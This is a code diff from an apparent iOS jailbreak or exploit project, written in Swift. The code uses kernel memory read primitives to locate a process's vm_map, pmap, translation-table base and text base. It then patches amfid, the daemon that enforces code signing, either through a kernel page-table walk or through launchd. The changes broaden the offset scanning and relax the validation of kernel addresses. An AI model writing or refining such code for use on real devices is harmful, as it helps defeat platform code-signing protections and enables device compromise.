@@ -229,35 +229,62 @@ final class ExpAmfidNopFinal {
         }
         log("  ✅ pmap (vm_map+0x\(String(format:"%x", pmapOffset))): 0x\(String(format:"%llx", pmap))")
         
-        // Read ttep (pmap+0x0 is tte on most builds)
+        // Read ttep from pmap
         let ttep = ds_kread64(pmap + 0x0)
         log("  ttep (pmap+0x0): 0x\(String(format:"%llx", ttep))")
         
-        // Read text base
-        let textBase = ds_kread64(vmMap + 0x10)
-        log("  text base (vm_map+0x10): 0x\(String(format:"%llx", textBase))")
+        // Find text base — scan vm_map for userspace address
+        var textBase: UInt64 = 0
+        for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
+            let val = ds_kread64(vmMap + off)
+            if val >= 0x100000000 && val < 0x280000000000 {
+                textBase = val
+                log("  text base (vm_map+0x\(String(format:"%x", off))): 0x\(String(format:"%llx", val)) ✅")
+                break
+            }
+        }
         
-        // Validate — ttep should be a physical address (page-aligned)
-        // iPhone XR (A12) DRAM range varies — accept 0x100000000 to 0xA00000000
-        let ttepValid = ttep != 0 && ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0
+        if textBase == 0 {
+            // Try first vm_map_entry
+            let firstEntry = ds_kreadptr(vmMap + 0x08)
+            log("  first entry: 0x\(String(format:"%llx", firstEntry))")
+            if firstEntry != 0 && (firstEntry >> 32) > 0xFFFFFF00 {
+                for off: UInt64 in [0x08, 0x10, 0x18, 0x20] {
+                    let val = ds_kread64(firstEntry + off)
+                    if val >= 0x100000000 && val < 0x280000000000 {
+                        textBase = val
+                        log("  text base (entry+0x\(String(format:"%x", off))): 0x\(String(format:"%llx", val)) ✅")
+                        break
+                    }
+                }
+            }
+        }
+        
+        if textBase == 0 {
+            log("  ❌ text base not found in vm_map")
+        }
+        
+        // Validate ttep — can be kernel VA (0xfffffff0xx) or physical
+        let ttepIsKernVA = (ttep >> 32) > 0xFFFFFF00
+        let ttepIsPhys = ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0
+        let ttepValid = ttepIsKernVA || ttepIsPhys
         let textValid = textBase >= 0x100000000 && textBase < 0x280000000000
         
         log("")
         log("  Validation:")
-        log("    ttep physical (page-aligned): \(ttepValid ? "✅" : "❌")")
-        log("    text in userspace: \(textValid ? "✅" : "❌")")
+        log("    ttep (kernVA=\(ttepIsKernVA) phys=\(ttepIsPhys)): \(ttepValid ? "✅" : "❌")")
+        log("    text base: \(textValid ? "✅" : "❌")")
         
         guard ttepValid && textValid else {
             log("")
             log("❌ Cannot proceed — values invalid")
-            log("   Will NOT attempt page table walk (would crash)")
             performPatchViaLaunchd(amfidPid: amfidPid)
             return
         }
         
-        // NOW proceed with the actual patch
+        // Proceed with page table walk
         log("")
-        log("  All values valid — proceeding with page table walk...")
+        log("  All valid — page table walk...")
         patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
     }
     
